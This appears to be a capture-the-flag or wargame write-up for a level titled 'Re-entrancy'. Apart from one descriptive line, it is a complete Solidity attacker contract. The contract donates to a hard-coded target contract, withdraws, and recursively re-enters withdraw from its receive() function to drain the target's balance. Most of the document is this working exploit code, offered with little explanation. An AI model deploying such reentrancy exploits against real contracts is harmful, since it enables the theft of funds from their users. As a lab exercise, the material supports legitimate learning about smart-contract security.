# Level 10 - Re-entrancy

- Simple reentrancy vulnerability.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentrancyAttacker {
    address target = 0xDB79c8aEc384E9397532ad9358EC76a3d3F8CAeB;
    
    constructor() payable{}

    function startAttack() public payable {
        IReentrance(target).donate{value: address(this).balance}(address(this));
        IReentrance(target).withdraw(1000000000000000);
    }

    receive() external payable { 
        if(address(this).balance < 2000000000000000) {
            IReentrance(target).withdraw(1000000000000000);
        }
    }
}
```